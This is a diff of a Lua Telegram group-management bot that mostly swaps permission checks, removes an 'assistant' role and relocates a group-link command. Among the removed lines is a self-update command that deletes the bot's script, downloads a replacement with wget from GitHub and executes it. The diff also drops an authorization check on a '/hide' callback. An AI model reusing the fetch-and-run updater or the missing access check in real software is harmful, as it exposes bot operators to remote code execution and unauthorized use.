 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-if text and text:match("^حظر عام @(.*)$")  and msa3d(msg) then
+if text and text:match("^حظر عام @(.*)$")  and SudoBot(msg) then
 local username = text:match("^حظر عام @(.*)$") 
 if AddChannel(msg.sender_user_id_) == false then
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
@@ -6705,10 +6702,6 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-if bot_data:sismember(ban_id.."msa3d:ban", result.id_) then
-send(msg.chat_id_, msg.id_, " ● لا تسطيع حظر مساعد عام")
-return false 
-end
 usertext = '\n ● الـعـضو   ⋙ ['..result.title_..'](t.me/'..(username or 'SOURCEVENOM')..')'
 status  = '\n ● تم حظرو عام من الجروبات '
 texts = usertext..status
@@ -6721,7 +6714,7 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text and text:match("^حظر عام (%d+)$") and msa3d(msg) then
+if text and text:match("^حظر عام (%d+)$") and SudoBot(msg) then
 local userid = text:match("^حظر عام (%d+)$")
 if AddChannel(msg.sender_user_id_) == false then
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
@@ -6757,10 +6750,6 @@ if tonumber(userid) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ● لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if bot_data:sismember(ban_id.."msa3d:ban", userid) then
-send(msg.chat_id_, msg.id_, " ● لا تسطيع حظر مساعد عام")
-return false 
-end
 bot_data:sadd(ban_id..'GDRG:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
@@ -6774,7 +6763,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("كتم عام") and msg.reply_to_message_id_ and msa3d(msg) then
+if text == ("كتم عام") and msg.reply_to_message_id_ and SudoBot(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
 local textchuser = bot_data:get(ban_id..'text:ch:user')
@@ -6810,10 +6799,6 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ● لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if bot_data:sismember(ban_id.."msa3d:ban", result.sender_user_id_) then
-send(msg.chat_id_, msg.id_, " ● لا تسطيع كتم مساعد عام")
-return false 
-end
 bot_data:sadd(ban_id..'Gmute:User', result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
 function(arg,data) 
@@ -6825,7 +6810,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-if text and text:match("^كتم عام @(.*)$")  and msa3d(msg) then
+if text and text:match("^كتم عام @(.*)$")  and SudoBot(msg) then
 local username = text:match("^كتم عام @(.*)$") 
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
 if AddChannel(msg.sender_user_id_) == false then
@@ -6867,10 +6852,6 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ● لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-if bot_data:sismember(ban_id.."msa3d:ban", result.id_) then
-send(msg.chat_id_, msg.id_, " ● لا تسطيع كتم مساعد عام")
-return false 
-end
 usertext = '\n ● الـعـضو   ⋙ ['..result.title_..'](t.me/'..(username or 'SOURCEVENOM')..')'
 status  = '\n ● تم كتمه عام من الجروبات'
 texts = usertext..status
@@ -6883,7 +6864,7 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text and text:match("^كتم عام (%d+)$") and msa3d(msg) then
+if text and text:match("^كتم عام (%d+)$") and SudoBot(msg) then
 local userid = text:match("^كتم عام (%d+)$")
 if AddChannel(msg.sender_user_id_) == false then
 local Groups = bot_data:scard(ban_id..'Chek:Groups')  
@@ -6919,10 +6900,6 @@ if tonumber(userid) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ● لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if bot_data:sismember(ban_id.."msa3d:ban", userid) then
-send(msg.chat_id_, msg.id_, " ● لا تسطيع كتم مساعد عام")
-return false 
-end
 bot_data:sadd(ban_id..'Gmute:User', userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
@@ -6936,7 +6913,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("الغاء العام") and msg.reply_to_message_id_ and msa3d(msg) then
+if text == ("الغاء العام") and msg.reply_to_message_id_ and SudoBot(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = bot_data:get(ban_id..'text:ch:user')
 if textchuser then
@@ -6958,7 +6935,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-if text and text:match("^الغاء العام @(.*)$") and msa3d(msg) then
+if text and text:match("^الغاء العام @(.*)$") and SudoBot(msg) then
 local username = text:match("^الغاء العام @(.*)$") 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = bot_data:get(ban_id..'text:ch:user')
@@ -6984,7 +6961,7 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text and text:match("^الغاء العام (%d+)$") and msa3d(msg) then
+if text and text:match("^الغاء العام (%d+)$") and SudoBot(msg) then
 local userid = text:match("^الغاء العام (%d+)$")
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = bot_data:get(ban_id..'text:ch:user')
@@ -8148,93 +8125,8 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("رفع مساعد") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
-function Function_VENOM(extra, result, success)
-bot_data:del(ban_id.."msa3d:ban")
-bot_data:sadd(ban_id.."msa3d:ban", result.sender_user_id_)
-bot_data:set(ban_id.."id:msa3d:ban", result.sender_user_id_)
-Reply_Status(msg,result.sender_user_id_,"reply","● تم ترقيته مساعد في البوت")  
-end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_VENOM, nil)
-return false 
-end
-if text and text:match("^رفع مساعد @(.*)$") and SudoBot(msg) then
-local username = text:match("^رفع مساعد @(.*)$")
-function Function_VENOM(extra, result, success)
-if result.id_ then
-if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
-send(msg.chat_id_,msg.id_,"● عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
-return false 
-end      
-bot_data:del(ban_id.."msa3d:ban")
-bot_data:sadd(ban_id.."msa3d:ban", result.id_)
-bot_data:set(ban_id.."id:msa3d:ban", result.id_)
-Reply_Status(msg,result.id_,"reply","● تم ترقيته مساعد في البوت")  
-else
-send(msg.chat_id_, msg.id_,"● لا يوجد حساب بهاذا المعرف")
-end
-end
-tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_VENOM, nil)
-return false 
-end
-if text and text:match("^رفع مساعد (%d+)$") and SudoBot(msg) then
-local userid = text:match("^رفع مساعد (%d+)$")
-bot_data:del(ban_id.."msa3d:ban")
-bot_data:sadd(ban_id.."msa3d:ban", userid)
-bot_data:set(ban_id.."id:msa3d:ban", userid)
-Reply_Status(msg,userid,"reply","● تم ترقيته مساعد في البوت")  
-return false 
-end
-if text == ("تنزيل المساعد") and SudoBot(msg) then
-function Function_VENOM(extra, result, success)
-local id = bot_data:get(ban_id.."id:msa3d:ban")
-Reply_Status(msg,id,"reply","● تم تنزيله من المساعد")  
-bot_data:del(ban_id.."msa3d:ban")
-bot_data:del(ban_id.."id:msa3d:ban")
-end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_VENOM, nil)
-return false 
-end
-if text == ("تنزيل مساعد") and SudoBot(msg) then
-function Function_VENOM(extra, result, success)
-local id = bot_data:get(ban_id.."id:msa3d:ban")
-Reply_Status(msg,id,"reply","● تم تنزيله من المساعد")  
-bot_data:del(ban_id.."msa3d:ban")
-bot_data:del(ban_id.."id:msa3d:ban")
-end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_VENOM, nil)
-return false 
-end
-if text == "المساعد" or text == "مساعد" then
-local id = bot_data:get(ban_id.."id:msa3d:ban")
-local urrl = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..id)
-local json = JSON.decode(urrl)
-local name = json.result.first_name
-if json.result.username then
-username = json.result.username
-else
-username = 'SOURCEVENOM'
-end
-local Name = '〈 المساعد 〉 -  ['..name..'](tg://user?id='..result.id_..')\n'
-keyboard = {} 
-keyboard.inline_keyboard = {{{text = name, url="t.me/"..username}},}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..username..'&caption=' .. URL.escape(Name).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
-if text == 'المطور' or text == 'مطور' then 
-tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result)  
-local msg_id = msg.id_/2097152/0.5 
-local Text = "ᎠᎬᏙ ΝᎬᎷᎬ -> "..result.first_name_.."\nᎠᎬᏙ ႮՏᎬᎡ -> [@"..result.username_.."]\nᎠᎬᏙ ᎥᎠ -> "..SUDO..""
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = result.first_name_,url="t.me/"..result.username_}}, 
-{{text = 'اضغط لاضافه البوت لمجمعتك✅ ' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
-} 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end,nil)
-end
 ------------------------------------------------------------------------ adddev2 sudog
-if text == ("رفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and msa3d(msg) then
+if text == ("رفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
 function Function_VENOM(extra, result, success)
 bot_data:sadd(ban_id.."Dev:ban:2", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","● تم ترقيته مطور ثانوي في البوت")  
@@ -8242,7 +8134,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_VENOM, nil)
 return false 
 end
-if text and text:match("^رفع مطور ثانوي @(.*)$") and msa3d(msg) then
+if text and text:match("^رفع مطور ثانوي @(.*)$") and SudoBot(msg) then
 local username = text:match("^رفع مطور ثانوي @(.*)$")
 function Function_VENOM(extra, result, success)
 if result.id_ then
@@ -8259,13 +8151,13 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_VENOM, nil)
 return false 
 end
-if text and text:match("^رفع مطور ثانوي (%d+)$") and msa3d(msg) then
+if text and text:match("^رفع مطور ثانوي (%d+)$") and SudoBot(msg) then
 local userid = text:match("^رفع مطور ثانوي (%d+)$")
 bot_data:sadd(ban_id.."Dev:ban:2", userid)
 Reply_Status(msg,userid,"reply","● تم ترقيته مطور ثانوي في البوت")  
 return false 
 end
-if text == ("تنزيل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and msa3d(msg) then
+if text == ("تنزيل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
 function Function_VENOM(extra, result, success)
 bot_data:srem(ban_id.."Dev:ban:2", result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","● تم تنزيله من المطور ثانويين")  
@@ -8273,7 +8165,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_VENOM, nil)
 return false 
 end
-if text and text:match("^تنزيل مطور ثانوي @(.*)$") and msa3d(msg) then
+if text and text:match("^تنزيل مطور ثانوي @(.*)$") and SudoBot(msg) then
 local username = text:match("^تنزيل مطور ثانوي @(.*)$")
 function Function_VENOM(extra, result, success)
 if result.id_ then
@@ -8286,13 +8178,13 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_VENOM, nil)
 return false
 end  
-if text and text:match("^تنزيل مطور ثانوي (%d+)$") and msa3d(msg) then
+if text and text:match("^تنزيل مطور ثانوي (%d+)$") and SudoBot(msg) then
 local userid = text:match("^تنزيل مطور ثانوي (%d+)$")
 bot_data:srem(ban_id.."Dev:ban:2", userid)
 Reply_Status(msg,userid,"reply","● تم تنزيله من المطور ثانويين")  
 return false 
 end
-if text == ("الثانوين") and msa3d(msg) then
+if text == ("الثانوين") and SudoBot(msg) then
 local list = bot_data:smembers(ban_id.."Dev:ban:2")
 t = "\n ●  قائمة مطورين الثانويين للبوت \n●○━━━━ꪜꫀꪀꪮꪑ━━━━○●\n"
 for k,v in pairs(list) do
@@ -8308,7 +8200,7 @@ t = " ●  لا يوجد مطورين ثانويين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("مسح الثانوين") and msa3d(msg) then
+if text == ("مسح الثانوين") and SudoBot(msg) then
 bot_data:del(ban_id.."Dev:ban:2")
 send(msg.chat_id_, msg.id_, "\n ● تم مسح قائمة المطورين الثانوين  ")
 end
@@ -12325,30 +12217,6 @@ send(msg.chat_id_, msg.id_," ● تم تعطيل نسبه جمالك")
 return false end
 end
 
-if text == "الرابط" then 
-local status_Link = bot_data:get(ban_id.."Link_Group:status"..msg.chat_id_) 
-if not status_Link then 
-send(msg.chat_id_, msg.id_,"الرابط معطل")  
-return false   
-end 
-tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
-local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
-if linkgpp.ok == true then 
-local linkgp = '• 🖤 |ＬＩＮＫ ＧＲＯＵＰ.\nـــــــــــــــــــــــــ\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
-keyboard = {} 
-keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
-https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(linkgp).."&parse_mode=markdown&reply_markup="..JSON.encode(keyboard)) 
-else 
-send(msg.chat_id_, msg.id_,'● لا يوجد رابط ارسل ضع رابط') 
-end 
-end,nil) 
-end
-if text == 'تحديث السورس' and Devban(msg) then 
-os.execute('rm -rf VENOM.lua')
-os.execute('wget https://raw.githubusercontent.com/VENOM197/Venom/main/VENOM.lua')
-send(msg.chat_id_, msg.id_,' ● تم تحديث السورس')
-dofile('VENOM.lua')  
-end
 
 if text == 'مسح الرابط' or text == 'مسح الرابط' then
 if Mod(msg) then     
@@ -13044,7 +12912,7 @@ return false
 end
 send(msg.chat_id_, msg.id_,' ● عدد رسائلك  ⋙ { '..bot_data:get(ban_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
 end 
-if text == 'تفعيل الاذاعه' and msa3d(msg) then  
+if text == 'تفعيل الاذاعه' and SudoBot(msg) then  
 if bot_data:get(ban_id..'Bc:Bots') then
 bot_data:del(ban_id..'Bc:Bots') 
 Text = '\n ● تم تفعيل الاذاعه' 
@@ -13053,7 +12921,7 @@ Text = '\n ● بالتاكيد تم تفعيل الاذاعه'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الاذاعه' and msa3d(msg) then  
+if text == 'تعطيل الاذاعه' and SudoBot(msg) then  
 if not bot_data:get(ban_id..'Bc:Bots') then
 bot_data:set(ban_id..'Bc:Bots',true) 
 Text = '\n ● تم تعطيل الاذاعه' 
@@ -13062,7 +12930,7 @@ Text = '\n ●  بالتاكيد تم تعطيل الاذاعه'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل التواصل' and msa3d(msg) then  
+if text == 'تفعيل التواصل' and SudoBot(msg) then  
 if bot_data:get(ban_id..'Tuasl:Bots') then
 bot_data:del(ban_id..'Tuasl:Bots') 
 Text = '\n ● تم تفعيل التواصل' 
@@ -13071,7 +12939,7 @@ Text = '\n ● بالتاكيد تم تفعيل التواصل'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل التواصل' and msa3d(msg) then  
+if text == 'تعطيل التواصل' and SudoBot(msg) then  
 if not bot_data:get(ban_id..'Tuasl:Bots') then
 bot_data:set(ban_id..'Tuasl:Bots',true) 
 Text = '\n ● تم تعطيل التواصل' 
@@ -13080,7 +12948,7 @@ Text = '\n ● بالتاكيد تم تعطيل التواصل'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل البوت الخدمي' and msa3d(msg) then  
+if text == 'تفعيل البوت الخدمي' and SudoBot(msg) then  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = bot_data:get(ban_id..'text:ch:user')
 if textchuser then
@@ -13098,7 +12966,7 @@ Text = '\n ● بالتاكيد تم تفعيل البوت الخدمي'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل البوت الخدمي' and msa3d(msg) then  
+if text == 'تعطيل البوت الخدمي' and SudoBot(msg) then  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = bot_data:get(ban_id..'text:ch:user')
 if textchuser then
@@ -13314,7 +13182,7 @@ end
 tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = ban_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
 end
 
-if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and msa3d(msg) then 
+if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
 if bot_data:get(ban_id..'Bc:Bots') and not Devban(msg) then 
 send(msg.chat_id_, msg.id_,' ● الاذاعه معطله من قبل المطور الاساسي')
 return false
@@ -13332,7 +13200,7 @@ bot_data:setex(ban_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id
 send(msg.chat_id_, msg.id_," ● ارسل الان اذاعتك \n ● للخروج ارسل الغاء") 
 return false
 end 
-if text=="اذاعه" and msg.reply_to_message_id_ == 0 and msa3d(msg) then 
+if text=="اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
 if bot_data:get(ban_id..'Bc:Bots') and not Devban(msg) then 
 send(msg.chat_id_, msg.id_,' ● الاذاعه معطله من قبل المطور الاساسي')
 return false
@@ -13350,7 +13218,7 @@ bot_data:setex(ban_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user
 send(msg.chat_id_, msg.id_," ● ارسل الان اذاعتك \n ● للخروج ارسل الغاء ") 
 return false
 end  
-if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and msa3d(msg) then 
+if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
 if bot_data:get(ban_id..'Bc:Bots') and not Devban(msg) then 
 send(msg.chat_id_, msg.id_,' ● الاذاعه معطله من قبل المطور الاساسي')
 return false
@@ -13368,7 +13236,7 @@ bot_data:setex(ban_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_use
 send(msg.chat_id_, msg.id_," ● ارسل لي التوجيه الان") 
 return false
 end 
-if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and msa3d(msg) then 
+if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
 if bot_data:get(ban_id..'Bc:Bots') and not Devban(msg) then 
 send(msg.chat_id_, msg.id_,' ●  الاذاعه معطله من قبل المطور الاساسي')
 return false
@@ -14325,7 +14193,24 @@ Text = '\n ● بالتاكيد تم تعطيل الايدي بالصوره'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-
+if text == "الرابط" then 
+local status_Link = bot_data:get(ban_id.."Link_Group:status"..msg.chat_id_) 
+if not status_Link then 
+send(msg.chat_id_, msg.id_,"الرابط معطل")  
+return false   
+end 
+tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
+local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
+if linkgpp.ok == true then 
+local linkgp = '• 🖤 |ＬＩＮＫ ＧＲＯＵＰ.\nـــــــــــــــــــــــــ\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
+keyboard = {} 
+keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
+https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(linkgp).."&parse_mode=markdown&reply_markup="..JSON.encode(keyboard)) 
+else 
+send(msg.chat_id_, msg.id_,'● لا يوجد رابط ارسل ضع رابط') 
+end 
+end,nil) 
+end
 if text == 'تغير الايدي' and Manager(msg) then 
 local List = {
 [[
@@ -14930,7 +14815,7 @@ Msᴀɢ ~ #msgs
 ]],
 [[
 𝒔𝒕𝒂𓂅 #stast 𓍯
-𝐮𝐬𝐞??𓂅 #username 𓍯
+𝐮𝐬𝐞𝐫𓂅 #username 𓍯
 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯
 𝐢𝐝 𓂅 #id 𓍯
 𓂅 𝗖𝗛 - 「@SOURCEVENOM」 💞.
@@ -14970,7 +14855,7 @@ Msᴀɢ ~ #msgs
 👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
 👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
 👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
-??🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
+👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
 👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
 👳🏼‍♂ - 𝄬 𝗖𝗛 - 「@SOURCEVENOM」 ●.
 ]],
@@ -16860,11 +16745,6 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessageText?ch
 end
 
 if Text == '/hide' then
-if not CoSu(data) then
-local notText = '✘ عذرا الاوامر هذه لا تخصك'
-https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
-return false
-end
 local hide = 'تم اخفاء الاوامر'
 DeleteMessage(Chat_id,{[0] = Msg_id})  
 https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(hide)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
